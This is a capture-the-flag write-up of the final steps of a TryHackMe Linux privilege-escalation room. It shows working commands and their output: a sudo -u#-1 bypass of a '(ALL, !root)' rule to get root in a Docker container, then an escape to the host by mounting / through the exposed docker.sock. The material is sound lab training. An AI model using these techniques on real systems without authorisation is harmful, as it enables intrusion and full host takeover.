## Game Zone
*This Room will help you to sharpen your Linux Skills and help you to learn basic privilege escalation in a HITMAN theme. So, pack your briefcase and grab your SilverBallers as its gonna be a tough ride.*

This is [Linux Agency](https://tryhackme.com/room/linuxagency) from THM. It doesn't seem to have a rating? There are 31 flags which mostly involve basic concepts to grab, then you escalate through a bunch of users mostly with GTFOBins techniques. It's only the last part I'm going to mention.

## Final Steps
As *maya*, linpeas shows us this:

>root      1395  0.0  0.3 404800  3432 ?        Sl   01:41   0:00  _ /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 2222 -container-ip 172.17.0.2 -container-port 22

We log in as robert using his SSH key and passphrase we found earlier:

{% highlight shell %}
maya@linuxagency:~/old_robert_ssh$ ssh -p 2222 -i id_rsa robert@localhost
robert@localhosts password: 
Last login: Tue Jan 12 17:02:07 2021 from 172.17.0.1
robert@ec96850005d6:~$
{% endhighlight %}

We're in a docker container.

We can become root in the container:

{% highlight shell %}
robert@ec96850005d6:~$ sudo -l
Matching Defaults entries for robert on ec96850005d6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on ec96850005d6:
    (ALL, !root) NOPASSWD: /bin/bash
robert@ec96850005d6:~$ sudo -u#-1 /bin/bash
root@ec96850005d6:~#
{% endhighlight %}

And then escape it:

``
root@ec96850005d6:/root# /tmp/docker -H unix:///run/docker.sock images -a
``

There is one called *mangoman*.

{% highlight shell %}
root@ec96850005d6:/root# /tmp/docker run -it -v /:/host mangoman chroot /host/ bash
root@7aebfd2b211c:/#
{% endhighlight %}

Note: docker wasn't in the path, it was in */tmp* for some reason; probably to make it harder. Linpeas pointed out *run/docker.sock*. 

{% highlight shell %}
root@7aebfd2b211c:~# cat message.txt 
Nice Job 47
